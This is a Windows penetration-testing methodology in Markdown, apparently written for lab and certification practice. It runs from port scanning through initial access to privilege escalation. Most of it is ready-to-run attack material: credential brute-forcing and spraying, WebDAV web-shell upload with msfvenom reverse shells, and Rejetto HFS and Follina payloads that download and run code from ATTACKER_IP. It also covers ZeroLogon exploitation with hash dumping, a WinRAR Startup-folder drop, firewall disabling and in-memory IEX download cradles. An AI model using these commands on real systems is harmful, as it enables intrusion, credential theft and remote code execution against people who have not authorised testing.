# Windows Penetration Testing Methodology

This methodology covers standalone Windows machines and domain-joined workstations (local attacks only). For Active Directory domain-level attacks, see [active-directory-methodology.md](active-directory-methodology.md).
For initial service discovery and port scanning, start with [enumeration-methodology.md](enumeration-methodology.md).

> **Automation shortcut (post-foothold):** Once you have a Windows shell, run:
>
> ```powershell
> powershell -ep bypass -f automation\recon.ps1
> ```
>
> Output: `.\loot_<host>_<ts>\` with categorized files (`privesc.txt`, `creds.txt`, `services.txt`, `network.txt`, `domain.txt`, `av.txt`, `apps.txt`) plus `summary.md` with priority findings. Read-only, no exploitation, PS 5.1 compatible (default on Win10/11/Server 2016+). Cross-references back to phases below.
>
> **Domain-joined hosts:** runs full ADSI enum (no RSAT required) into `domain_enum.txt` — high-value group memberships, Kerberoastable users (SPN+user), ASREPRoastable (`DONT_REQ_PREAUTH`), MachineAccountQuota, ADCS published CAs + templates, FGPP, GPO inventory, SYSVOL GPP cpassword sweep, domain trusts, gpresult.
>
> **BloodHound auto-collect:** if SharpHound.exe is reachable, it runs automatically and drops the ZIP into `.\loot_*\bloodhound\bh.zip`. Recommended setup — host on Kali (Kali bundles it):
> ```bash
> # Kali side — host SharpHound CE over HTTP
> sudo python3 -m http.server 80 --directory /usr/share/bloodhound-ce/collectors
> ```
> ```powershell
> # Windows target side — set the URL before running recon.ps1
> $env:SHARPHOUND_URL = 'http://<KALI_IP>/SharpHound.exe'
> powershell -ep bypass -f automation\recon.ps1
> ```
> SMB UNC fallback (`\\<KALI_IP>\sh\SharpHound.exe`) supported when HTTP egress is blocked.
>
> Equivalent Linux scripts: `automation/recon.sh` and `python3 automation/recon.py --mode host`.
>
> Full reference (output layout, env vars, Kali HTTP/SMB hosting, troubleshooting): [automation/README.md](automation/README.md).

---

## Phase 1: Reconnaissance & Service Enumeration

**Goal:** Discover all exposed services, OS version, and potential attack surface.

### 1.1 Port Scanning

> Canonical port-scan reference is in [enumeration-methodology.md Phase 1 — Full Port Scanning](enumeration-methodology.md#phase-1-full-port-scanning). Quick recap:

```bash
nmap -p- --min-rate 5000 -Pn <TARGET>                           # fast full TCP
nmap -p <OPEN_PORTS> -sC -sV -Pn <TARGET>                        # version + default scripts
sudo nmap -sU --top-ports 100 --min-rate 2000 -Pn <TARGET>       # UDP top-100 (slow, background)
```

#### Living-off-the-land equivalent — native Windows port sweep

When on a Windows pivot host with no nmap, no rustscan. See [enumeration-methodology.md](enumeration-methodology.md#11-tcp-all-ports) Phase 1.2 for the full block.

```powershell
# PowerShell 5.1 sequential (Win 8.1 / Server 2012 R2+)
80,135,139,389,443,445,3389,5985 | ForEach-Object {
    $r = Test-NetConnection -ComputerName <IP> -Port $_ -WarningAction SilentlyContinue
    if ($r.TcpTestSucceeded) { "tcp/$_ OPEN" }
}

# PowerShell 7+ parallel (Win11 default; Win10 / Server 2016-2022 require pwsh install)
1..1024 | ForEach-Object -Parallel {
    $tcp = New-Object Net.Sockets.TcpClient
    $iar = $tcp.BeginConnect('<IP>', $_, $null, $null)
    if ($iar.AsyncWaitHandle.WaitOne(200)) { "tcp/$_ OPEN" }
    $tcp.Close()
} -ThrottleLimit 100

# Pure cmd.exe — works on every Windows since PS 2.0
for /L %p in (1,1,1024) do @powershell -nop -c "try{(New-Object Net.Sockets.TcpClient).Connect('<IP>',%p);'%p OPEN'}catch{}"
```

### 1.2 DNS Enumeration

> See [DNS enumeration (TCP/UDP 53)](enumeration-methodology.md#34-dns-tcpudp-53).

### 1.3 SMB Enumeration (TCP 139/445)

> SMB enumeration commands (null/guest, `--shares`, `--rid-brute`, `--gen-relay-list`, recursive `mget`): see [enumeration-methodology.md](enumeration-methodology.md) Phase 3.5.

Windows-specific SMB primitives (native, no Linux tools needed) — for use once landed on a Windows host:

```cmd
:: Mount a share (will use current Kerberos / NTLM context)
net use \\<IP>\<SHARE>
net use Z: \\<IP>\<SHARE> /user:<DOMAIN>\<USER> <PASSWORD>

:: List share contents from cmd.exe
dir \\<IP>\C$
dir \\<IP>\<SHARE>

:: Drop a payload onto a writable share
copy C:\temp\shell.exe \\<IP>\<SHARE>\
```

### 1.4 RPC / WMI Enumeration (TCP 135/593)

> See [RPC / MSRPC (TCP 111 / 135)](enumeration-methodology.md#39-rpc--msrpc-tcp-111--135) and [WMI (TCP 135)](enumeration-methodology.md#326-wmi-tcp-135).

### 1.5 LDAP Enumeration (TCP 389/636/3268)

> See [LDAP (TCP 389 / 636 / 3268 / 3269)](enumeration-methodology.md#310-ldap-tcp-389--636--3268--3269).

### 1.6 SNMP Enumeration (UDP 161)

> See [SNMP (UDP 161)](enumeration-methodology.md#311-snmp-udp-161).

### 1.7 WinRM (TCP 5985/5986)

> See [WinRM (TCP 5985 / 5986)](enumeration-methodology.md#316-winrm-tcp-5985--5986).

### 1.8 MSSQL (TCP 1433)

> See [MSSQL (TCP 1433)](enumeration-methodology.md#313-mssql-tcp-1433).

### 1.9 Kerberos (TCP 88)

> User enumeration via Kerberos (kerbrute userenum / passwordspray / bruteuser) — see [active-directory-methodology.md](active-directory-methodology.md) §1.3.

```bash
# Nmap Kerberos enumeration (Windows-host context — host-side script, not part of AD-methodology kerbrute chain)
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>',userdb=users.txt -Pn <IP>
```

### 1.10 Web Services (TCP 80/443/8080/8443)
```bash
# Technology fingerprinting
whatweb http://<IP>

# Directory brute-force
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x aspx,asp,html,txt -t 50

# Check for IIS shortname vulnerability
# https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar http://<IP>/
```
> For detailed web testing, see [web-methodology.md](web-methodology.md).

### 1.11 FTP (TCP 21)

> See [FTP (TCP 21)](enumeration-methodology.md#31-ftp-tcp-21).

### 1.12 SMTP (TCP 25)

> See [SMTP (TCP 25 / 465 / 587)](enumeration-methodology.md#33-smtp-tcp-25--465--587).

### 1.13 RDP Enumeration (TCP 3389)
```bash
# Extract hostname, domain, FQDN, OS version from NTLM info
nmap -p 3389 --script rdp-ntlm-info -Pn <IP>

# Check for NLA (Network Level Authentication)
nmap -p 3389 --script rdp-enum-encryption -Pn <IP>

# MS12-020 check (legacy RDP vuln, not BlueKeep)
nmap -p 3389 --script rdp-vuln-ms12-020 -Pn <IP>
# For BlueKeep (CVE-2019-0708):
# 1) nmap -p 3389 --script rdp-ntlm-info -Pn <IP> and verify vulnerable OS build
# 2) msfconsole → auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

---

## Phase 2: Initial Access & Foothold

**Goal:** Obtain first set of credentials, a hash, or remote code execution.

### 2.1 Credential Brute-Force
```bash
# SMB brute-force
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success

# WinRM brute-force
netexec winrm <IP> -u users.txt -p passwords.txt --continue-on-success

# RDP brute-force
hydra -L users.txt -P passwords.txt rdp://<IP> -t 4

# MSSQL brute-force
hydra -L users.txt -P passwords.txt mssql://<IP>
```

### 2.2 Password Spraying
```bash
# Spray a single password across users
netexec smb <IP> -u users.txt -p 'Welcome1!' --continue-on-success

# Common passwords to try: <SEASON><YEAR>!, Company+123, Password1, Welcome1
```

### 2.3 Network Poisoning (Requires LAN Access)

> Network poisoning (Responder/Inveigh/ntlmrelayx) is an AD attack — see [active-directory-methodology.md](active-directory-methodology.md) §1.6 LLMNR/NBT-NS Poisoning for the full chain (capture → crack `-m 5600` → relay-list → ntlmrelayx).

### 2.4 MSSQL Exploitation

Full MSSQL playbook (impacket-mssqlclient connect, `xp_cmdshell`, `EXECUTE AS LOGIN`, linked-server hops, NTLM coercion, OLE Automation, CLR Assembly UNSAFE, file read/write, MSSQL→AD pivot): [attacking-common-applications.md § Phase 14v](attacking-common-applications.md#phase-14v-microsoft-sql-server-tcp-1433).

The Windows-foothold-specific variants below are **not duplicated there** — keep them here.

```bash
# === Kerberos auth (after kinit on the foothold) — useful when password/hash is stale ===
impacket-mssqlclient <DOMAIN>/<USER>@<IP> -k -no-pass -windows-auth

# === Legacy NTLM-hash-theft variant (when xp_dirtree / xp_subdirs / xp_fileexist are filtered) ===
# SQL> EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft','x'

# === MSSQLPwner — automated linked-server chain discovery + RCE (one-shot from Linux/WSL) ===
# https://github.com/ScorpionesLabs/MSSqlPwner
mssqlpwner <DOMAIN>/<USER>:<PASS>@<IP> -windows-auth interactive          # explore graph
mssqlpwner <DOMAIN>/<USER>:<PASS>@<IP> -windows-auth exec -chain-id <ID> -command "whoami"

# === PowerUpSQL — when you already have a Windows foothold and don't want to drop Python tooling ===
# (Same primitives as Phase 14v but native PS — no impacket dependency.)
Invoke-SQLAuditDefaultLoginPw -Verbose
Get-SQLServerLinkCrawl -Instance <SERVER> -Verbose
Invoke-SQLEscalatePriv -Instance <SERVER> -Verbose
Get-SQLServerLinkCrawl -Instance <SERVER> -Query "exec master..xp_cmdshell 'whoami'"
```

### 2.5 IIS WebDAV Exploitation
```bash
# Check if WebDAV is enabled
davtest -url http://<IP>/
curl -X OPTIONS http://<IP>/ -v   # Look for DAV header and PROPFIND/PUT/MOVE

# Upload web shell via PUT
curl -X PUT http://<IP>/shell.aspx -d @shell.aspx
curl -X PUT http://<IP>/shell.txt -d @shell.aspx
# If .aspx blocked, upload as .txt then MOVE
curl -X MOVE -H "Destination: http://<IP>/shell.aspx" http://<IP>/shell.txt

# With credentials
cadaver http://<IP>/
# dav:/> put shell.aspx

# Generate ASPX web shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o shell.aspx
```

### 2.5b IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow — CVE-2017-7269

> **Precondition:** IIS 6.0 (Windows Server 2003 R2) with WebDAV enabled. Pre-auth RCE in `ScStoragePathFromUrl` via overlong `If:` header in PROPFIND request.

```bash
# Fingerprint IIS 6.0 + WebDAV
curl -I http://<IP>/                              # Server: Microsoft-IIS/6.0
curl -X OPTIONS http://<IP>/ -v                   # MS-Author-Via: DAV
nmap -p 80 --script http-iis-webdav-vuln <IP>

# Public PoC — CVE-2017-7269 (zcgonvh / edwardz246003)
# Exploit (Metasploit)
# msfconsole → use exploit/windows/iis/iis_webdav_scstoragepathfromurl
# set RHOSTS <IP> → set LHOST <ATTACKER_IP> → set TARGETURI / → run
# Manual python PoC
python3 cve-2017-7269.py <IP> 80 <ATTACKER_IP> <PORT>
```

### 2.6 Known Service Exploits
- **EternalBlue (MS17-010):** SMB RCE on unpatched Windows 7/2008/2012
- **BlueKeep (CVE-2019-0708):** RDP RCE on Windows 7/2008 R2
- **PrintNightmare (CVE-2021-1675 / CVE-2021-34527):** Print Spooler RCE
- **ZeroLogon (CVE-2020-1472):** Netlogon privilege escalation → instant DA
- **smbGhost (CVE-2020-0796):** SMBv3 RCE on Windows 10 1903/1909
- **Always check:** `searchsploit <service> <version>`

```bash
# === EternalBlue (MS17-010) ===
# Check
nmap -p 445 --script smb-vuln-ms17-010 -Pn <IP>
# Exploit (Metasploit)
# msfconsole → use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS <IP> → set LHOST <ATTACKER_IP> → run
# Manual (without Metasploit)
python3 MS17-010/zzz_exploit.py <IP>

# === BlueKeep (CVE-2019-0708) ===
# Check
nmap -p 3389 --script rdp-ntlm-info -Pn <IP>   # Check OS version
# Metasploit: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
# Exploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# === ZeroLogon (CVE-2020-1472) ===
# Applies when: DC missing Aug 2020 patches (KB4565351 etc.) — rare on real targets, common on lab/exam DCs
# Test cost: ~5s — tester does ~2000 RPC pairs and stops; always run
# If patched: tester gives up at attempt 2000 → no fallback at the netlogon layer; pivot to other AD vectors
python3 zerologon_tester.py <DC_HOSTNAME> <DC_IP>          # https://github.com/SecuraBV/CVE-2020-1472
# Exploit (sets DC machine password to empty)
python3 cve-2020-1472-exploit.py <DC_HOSTNAME> <DC_IP>     # https://github.com/dirkjanm/CVE-2020-1472
# Then dump hashes with empty password
impacket-secretsdump -no-pass -just-dc <DOMAIN>/<DC_HOSTNAME>\$@<DC_IP>
# ⚠️ RESTORE the machine password after or the DC will break! — see https://github.com/risksense/zerologon (reinstate-original-pw.py)
# Metasploit: use auxiliary/admin/dcerpc/cve_2020_1472_zerologon

# === smbGhost (CVE-2020-0796) ===
nmap -p 445 --script smb-protocols -Pn <IP>
# Vulnerable if SMBv3.1.1 on Windows 10 1903/1909
# Metasploit: use exploit/windows/smb/cve_2020_0796_smbghost

# === SearchSploit — always search for service + version ===
searchsploit <SERVICE> <VERSION>
searchsploit -m <EXPLOIT_ID>   # Mirror exploit to current directory
```

### 2.6b CVE-2014-6287 — Rejetto HFS Pre-Auth RCE (HttpFileServer <= 2.3)

Rejetto HTTP File Server versions <= 2.3 are vulnerable to remote code execution via null-byte expression parsing in the search parameter. Common on HTB/OSCP/CPTS lab boxes (machine: Optimum).

```bash
# Fingerprint — HFS banner in Server header
curl -s -I http://<TARGET>:<PORT>/ | grep -i 'server'
# Expected: Server: HFS 2.3  (or lower)
nmap -p <PORT> -sV -Pn <TARGET>  # HttpFileServer httpd 2.3

# Manual PoC — null-byte scripting injection via search parameter
# Payload executes VBScript that downloads and runs attacker binary
curl -s "http://<TARGET>:<PORT>/?search=%00{.exec|C%3a%5cWindows%5cSystem32%5ccmd.exe+/c+certutil+-urlcache+-f+http%3a//<ATTACKER_IP>/<PAYLOAD>.exe+C%3a%5cWindows%5cTemp%5c<PAYLOAD>.exe.}" > /dev/null
curl -s "http://<TARGET>:<PORT>/?search=%00{.exec|C%3a%5cWindows%5cTemp%5c<PAYLOAD>.exe.}" > /dev/null

# Nishang PowerShell one-liner variant
# URL-encode: powershell IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')
curl -s "http://<TARGET>:<PORT>/?search=%00{.exec|C%3a%5cWindows%5cSystem32%5cWindowsPowerShell%5cv1.0%5cpowershell.exe+-nop+-ep+bypass+-c+IEX(New-Object+Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1').}" > /dev/null

# Metasploit
# msfconsole → use exploit/windows/http/rejetto_hfs_exec
# set RHOSTS <TARGET> → set RPORT <PORT> → set LHOST <ATTACKER_IP> → run
```

#### Living-off-the-land / LOTL variant

```bash
# No LOTL applies — this is an initial-access exploit fired from the attacker box.
# The exploit itself abuses native Windows binaries (certutil/powershell) on the target for staging.
```

### 2.6c CVE-2022-30190 Follina — MSDT ms-msdt URI Handler RCE

Pre-auth RCE via a malicious Office document (or HTML file) that invokes the `ms-msdt:` protocol handler, which calls `msdt.exe` with attacker-controlled diagnostic parameters including PowerShell execution. No macros required — works with Protected View disabled or via RTF (which does not trigger Protected View).

```bash
# Generate Follina payload (john-hammond PoC or manual)
# https://github.com/JohnHammond/msdt-follina
python3 follina.py -i <ATTACKER_IP> -p <ATTACKER_PORT> -r <PORT_FOR_HTTP>
# Outputs: follina.doc (or .docx) + starts HTTP listener serving the HTML payload

# Manual payload construction — HTML file that triggers ms-msdt:
# The HTML uses an OLEObject in the document that references an external HTML:
# <Relationship ... Target="http://<ATTACKER_IP>/exploit.html" TargetMode="External"/>
# exploit.html contains:
# <script>location.href="ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebsowseForFile=? /param IT_LaunchMethod=ContextMenu /param IT_BrowseForFile=/$(IEX($(cmd /c 'calc.exe')))/../../$(powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1'))/.. \""; </script>

# RTF variant (bypasses Protected View — RTF auto-renders OLE objects)
python3 follina.py -i <ATTACKER_IP> -p <ATTACKER_PORT> -r <PORT_FOR_HTTP> -t rtf
```

```bash
# Delivery — host the doc and HTML on attacker, social-engineer the click
# Or serve via already-compromised web server / email attachment
sudo python3 -m http.server <PORT_FOR_HTTP>  # serves exploit.html + stages
# Listener for callback:
rlwrap nc -lvnp <ATTACKER_PORT>
```

#### Living-off-the-land / LOTL variant

```bash
# The exploit itself IS LOTL — it abuses msdt.exe (signed Microsoft binary) to execute PowerShell.
# From the target's perspective, only msdt.exe and powershell.exe run — no dropped binaries.
# Mitigation check (if this was patched):
# reg query "HKCR\ms-msdt" → if key absent, the handler is disabled (patched)
```

### 2.6d WinRAR ACE Path-Traversal Arbitrary File Write (CVE-2018-20250)

WinRAR versions prior to 5.61 use a vulnerable `UNACEV2.DLL` for ACE archive extraction. A crafted ACE archive (disguised as `.rar`) writes files to arbitrary paths during extraction, enabling code execution by dropping into Startup or other auto-run locations.

```bash
# Generate malicious ACE archive (on attacker)
# https://github.com/WyAtu/CVE-2018-20250 (evilWinRAR generator)
python3 evilWinRAR.py -o payload.rar -e C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start\ Menu\Programs\Startup\shell.exe -p <PAYLOAD_EXE>

# Alternative: acefile.py (https://github.com/droe/acefile)
# Craft ACE with path traversal: ../../../Users/<USER>/AppData/Roaming/.../Startup/payload.exe

# Delivery — place on a share the target user will browse, or send via email
# When victim extracts with WinRAR < 5.61, payload drops into their Startup folder
```

```bash
# Check WinRAR version on target (post-foothold — confirm vulnerability)
reg query "HKLM\SOFTWARE\WinRAR" /v "exe64" 2>nul
reg query "HKLM\SOFTWARE\WOW6432Node\WinRAR" 2>nul
dir "C:\Program Files\WinRAR\WinRAR.exe"
# (Get-Item "C:\Program Files\WinRAR\WinRAR.exe").VersionInfo.FileVersion
# Vulnerable if < 5.61
```

#### Living-off-the-land / LOTL variant

```bash
# No LOTL — this is a client-side initial-access exploit. The archive generation happens on the attacker.
# The exploit abuses WinRAR's UNACEV2.DLL on the victim during normal extraction.
```

### 2.7 AS-REP Roasting (No Prior Creds Needed)

> AS-REP roasting (impacket-GetNPUsers + hashcat -m 18200, plus LOTL adsisearcher variant) — see [active-directory-methodology.md](active-directory-methodology.md) §1.4 for the canonical chain.

### 2.8 ADCS (Active Directory Certificate Services) — Quick Check
```bash
# If the target is domain-joined and ADCS is present, check for vulnerable templates
# This is a common CPTS/OSCP escalation path

# From Linux (certipy-ad is the current package name, replaces older certipy):
# https://github.com/ly4k/Certipy
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable

# From Windows:
# https://github.com/GhostPack/Certify
.\Certify.exe find /vulnerable
```
> For full ADCS attack chains (ESC1–ESC8), see [active-directory-methodology.md](active-directory-methodology.md).

### 2.9 OS Fingerprinting via Arbitrary File Read Primitive

When SMB/RDP banner is unreachable but an arbitrary read primitive exists (TFTP, LFI, XXE, SQLi `BULK`/`OPENROWSET`, SSRF `file://`), use sentinel-file presence + EULA header to pin Windows version → drives exploit selection (MS08-067, MS17-010, etc.).

```bash
# Probe 1 — license.rtf (Vista / 7 / 2008+) — absent on XP / 2003
# TFTP read primitive
tftp <TARGET>
tftp> get /windows/system32/license.rtf license.rtf
# 'File not found' / error → likely XP / 2003
# File returned       → Vista / 7 / 2008 / 2012+

# LFI read primitive
curl -s "http://<TARGET>/<APP_PATH>?file=C:\Windows\System32\license.rtf" -o license.rtf

# SQLi BULK read primitive (MSSQL)
# SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\license.rtf', SINGLE_CLOB) AS x

# Probe 2 — eula.txt header reveals exact edition + service pack
tftp> get /windows/system32/eula.txt eula.txt
head -10 eula.txt
# Strings to grep:
#   'MICROSOFT WINDOWS XP PROFESSIONAL EDITION SERVICE PACK 3'
#   'WINDOWS SERVER 2003'
#   'WINDOWS VISTA' / 'WINDOWS 7' / 'WINDOWS SERVER 2008'

# Probe 3 — registry SOFTWARE hive (if read primitive can pull config files offline)
tftp> get /windows/system32/config/SOFTWARE SOFTWARE.hive
# Then offline:
reged -x SOFTWARE.hive 'HKLM\SOFTWARE' 'Microsoft\Windows NT\CurrentVersion' /tmp/cv.reg
grep -E 'CurrentVersion|CurrentBuild|ProductName|CSDVersion' /tmp/cv.reg
# ProductName → 'Windows XP', 'Windows 7 Ultimate', 'Windows Server 2008 R2 Standard'
# CurrentBuild → 2600 (XP), 3790 (2003), 6001-6002 (Vista/2008), 7600-7601 (7/2008R2)

# Probe 4 — alternate sentinels when license.rtf / eula.txt blocked
# C:\Windows\System32\drivers\etc\hosts          (always present, content varies)
# C:\Windows\System32\notepad.exe                (file-size delta across versions)
# C:\Windows\System32\winver.exe                 (always present)
# C:\Windows\WindowsUpdate.log                   (XP-2008R2 only — text log)
# C:\Windows\Logs\CBS\CBS.log                    (Vista+ only — Component-Based Servicing)
# C:\Windows\System32\sysprep\sysprep.exe        (Vista+; XP uses C:\sysprep\)
```

> **Sentinel cheat sheet:**
> | File present | Likely version |
> |---|---|
> | `eula.txt` only, no `license.rtf` | XP / Server 2003 |
> | `license.rtf` + `WindowsUpdate.log` | Vista / 7 / 2008 / 2008 R2 |
> | `license.rtf` + `CBS.log`, no `WindowsUpdate.log` | 8 / 8.1 / 2012 / 2012 R2 |
> | `license.rtf` + `Logs\DISM\dism.log` | 10 / 11 / 2016 / 2019 / 2022 |

> **Why it matters:** Once version is pinned, exploit selection is mechanical — XP/2003 → MS08-067 / MS06-040; 7/2008 unpatched → MS17-010 EternalBlue, MS10-061 PrintSpooler MOF; 7/2008 R2 → BlueKeep CVE-2019-0708; all → check `searchsploit windows <version> <build>` for kernel local privesc once a foothold lands.

---

## Phase 3: Post-Exploitation Checklist

**Goal:** Immediately gather situational awareness after gaining a foothold.

### 3.1 System Information
```powershell
# Identity and privileges
whoami /all
net user %USERNAME%

# System info
systeminfo
hostname

# Check if domain-joined
systeminfo | findstr /i "domain"
net config workstation

# AV / EDR detection
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName
sc query WinDefend
Get-MpComputerStatus   # PowerShell
tasklist /v | findstr -i "defender crowd sentinel carbon"
```

### 3.2 Network Information
```powershell
ipconfig /all
route print
arp -a
netstat -ano

# Check for dual-homed / multi-NIC (pivot opportunity)
ipconfig /all | findstr "IPv4"

# DNS servers (useful for AD enumeration)
ipconfig /all | findstr "DNS"
```

### 3.2b Mapped / Hidden Drive Enumeration

Already-mapped drives on a compromised host reveal lateral pivot targets (file servers, NAS, DFS roots) without additional network scanning.

```powershell
# PowerShell — all PSDrives including mapped network drives
Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot } | Format-Table Name, DisplayRoot, Used, Free

# WMI — mapped logical disks (DriveType 4 = Network)
Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 4 } | Select DeviceID, ProviderName, VolumeName

# WMI — MappedLogicalDisk class (user-mapped only, not system)
Get-WmiObject Win32_MappedLogicalDisk | Select Name, ProviderName, SessionID

# Persistent mappings stored in registry (survive logoff)
Get-ChildItem 'HKCU:\Network' -ErrorAction SilentlyContinue | ForEach-Object {
    Get-ItemProperty $_.PSPath | Select PSChildName, RemotePath, UserName
}
```

```cmd
:: cmd.exe native — shows active net use mappings
net use

:: wmic for all logical disks
wmic logicaldisk where drivetype=4 get caption,providername,volumename
```

#### Living-off-the-land / LOTL variant

```cmd
:: Pure cmd.exe — no PowerShell needed
net use
reg query HKCU\Network /s 2>nul
wmic logicaldisk where drivetype=4 get caption,providername
```

### 3.3 Firewall & Defender Status
```powershell
# Windows Firewall status
netsh advfirewall show allprofiles state

# Firewall rules (look for allowed inbound)
netsh advfirewall firewall show rule name=all dir=in | findstr "Rule Name Enabled Action"

# Disable firewall (requires admin)
netsh advfirewall set allprofiles state off

# Add firewall exception (requires admin)
netsh advfirewall firewall add rule name="Allow Port" dir=in action=allow protocol=tcp localport=<PORT>
```

### 3.4 Installed Software & Patches
```powershell
wmic product get name,version
wmic qfe list brief
# Look for missing critical patches — compare against known CVEs
```

#### 3.4b Installed Application Binary Version Fingerprinting (Non-MSI)

`wmic product` only lists MSI-installed software. Many applications (portable, NSIS, InnoSetup) are invisible to it. Use PE FileVersionInfo to fingerprint every EXE in Program Files for CVE lookup.

```powershell
# Get-Process bulk version dump — shows version of every running process
Get-Process | Where-Object { $_.Path } | Select-Object Name, Path,
    @{n='FileVersion';e={$_.FileVersionInfo.FileVersion}},
    @{n='ProductVersion';e={$_.FileVersionInfo.ProductVersion}} |
  Sort-Object Name | Format-Table -AutoSize

# Recursive EXE scan across Program Files (catches non-MSI installs)
Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' -Recurse -Filter *.exe -ErrorAction SilentlyContinue |
  ForEach-Object {
    $v = [System.Diagnostics.FileVersionInfo]::GetVersionInfo($_.FullName)
    if ($v.FileVersion) {
      [PSCustomObject]@{
        Name = $_.Name
        Path = $_.FullName
        FileVersion = $v.FileVersion
        ProductName = $v.ProductName
        CompanyName = $v.CompanyName
      }
    }
  } | Format-Table -AutoSize

# Single binary version check (quick targeted lookup)
(Get-Item "C:\Program Files\<APP>\<BINARY>.exe").VersionInfo | Format-List ProductName, FileVersion, ProductVersion
```

```cmd
:: cmd.exe — wmic for a single file
wmic datafile where "name='C:\\Program Files\\<APP>\\<BINARY>.exe'" get Version,Manufacturer
```

#### Living-off-the-land / LOTL variant

```cmd
:: Pure cmd.exe — no PowerShell needed
:: Uses filever.exe if available (Resource Kit) or falls back to wmic datafile
for /R "C:\Program Files" %f in (*.exe) do @wmic datafile where "name='%f'" get Name,Version 2>nul | findstr /v "^$"
```

### 3.5 Local Group Policy Privilege Rights Enumeration

Parse `GptTmpl.inf` cached on disk for `[Privilege Rights]` assignments. `SeServiceLogonRight` reveals service accounts (often with weak passwords); `SeInteractiveLogonRight` / `SeBatchLogonRight` reveal high-value accounts that may be Kerberoastable or RDP-able.

```cmd
:: Export local security policy to INF (any user can read the export)
secedit /export /cfg C:\Windows\Temp\secpol.inf /areas USER_RIGHTS

:: Grep for interesting privilege assignments
findstr /i "SeServiceLogonRight SeInteractiveLogonRight SeBatchLogonRight SeNetworkLogonRight SeBackupPrivilege SeRestorePrivilege" C:\Windows\Temp\secpol.inf
```

```powershell
# PowerShell — parse the exported INF for Privilege Rights section
secedit /export /cfg "$env:TEMP\secpol.inf" /areas USER_RIGHTS | Out-Null
$rights = Get-Content "$env:TEMP\secpol.inf" | Where-Object { $_ -match 'Se\w+Privilege|Se\w+Right' }
$rights | ForEach-Object { Write-Output $_ }

# Resolve SIDs to account names
$rights | ForEach-Object {
    $line = $_
    [regex]::Matches($_, '\*S-1-[\d-]+') | ForEach-Object {
        $sid = $_.Value.TrimStart('*')
        try {
            $name = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value
            $line = $line -replace [regex]::Escape($_.Value), "$($_.Value)($name)"
        } catch {}
    }
    Write-Output $line
}
```

```powershell
# Read cached GPO GptTmpl.inf files directly (no secedit needed)
Get-ChildItem -Recurse 'C:\Windows\System32\GroupPolicy' -Filter 'GptTmpl.inf' -ErrorAction SilentlyContinue |
  ForEach-Object {
    Write-Output "=== $($_.FullName) ==="
    Get-Content $_.FullName | Select-String 'SeServiceLogonRight|SeBatchLogonRight|SeInteractiveLogonRight'
  }
```

#### Living-off-the-land / LOTL variant

```cmd
:: Pure cmd.exe — secedit is a native binary
secedit /export /cfg %TEMP%\secpol.inf /areas USER_RIGHTS
type %TEMP%\secpol.inf | findstr /i "Right Privilege"
del %TEMP%\secpol.inf
```

---

## Phase 4: Local Privilege Escalation

**Goal:** Elevate from standard user to `NT AUTHORITY\SYSTEM` or Local Administrator.

### 4.1 Automated Enumeration
```powershell
# WinPEAS — comprehensive check  🟡 volumetric reg/file/service enum — Defender flags string "winpeas"; rename binary
# https://github.com/peass-ng/PEASS-ng/releases
.\winPEASany.exe

# Seatbelt — targeted checks
# https://github.com/GhostPack/Seatbelt
.\Seatbelt.exe -group=all

# PowerUp — service/registry/scheduled task checks
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp — C# port of PowerUp (works when PowerShell is restricted)
# https://github.com/GhostPack/SharpUp
.\SharpUp.exe audit

# PrivescCheck
# https://github.com/itm4n/PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

#### PrivescCheck — In-Memory Invocation (Single-File LOTL)

`PrivescCheck.ps1` is a self-contained PowerShell script with no dependencies; running it from memory writes nothing to disk and avoids most file-based detection. Pair this with the AMSI bypass from 4.10 if Defender is active.

```powershell
# One-liner — download in memory from attacker-hosted SimpleHTTPServer, run extended audit, write HTML+TXT report only
# 🔴 IEX + DownloadString from a public CDN (raw.githubusercontent.com etc.) is a textbook AMSI/Defender signature + EID 4104 ScriptBlockLogging match
# Attacker (Kali): obtain PrivescCheck.ps1 locally, then: python3 -m http.server 80
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PrivescCheck.ps1')
Invoke-PrivescCheck -Extended -Report "PrivescCheck_$env:COMPUTERNAME" -Format TXT,HTML

# Add CSV/XML for report appendix
Invoke-PrivescCheck -Extended -Report "PrivescCheck_$env:COMPUTERNAME" -Format TXT,HTML,CSV,XML

# Audit-mode (skip checks that may alert EDR — token + service write probes)
Invoke-PrivescCheck -Audit

# Filter to a single category for fast iteration
Invoke-PrivescCheck -Categories Services,Credentials -Extended

# Export the script over SOCKS and run from a UNC path (when egress is blocked)
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PrivescCheck.ps1')
```

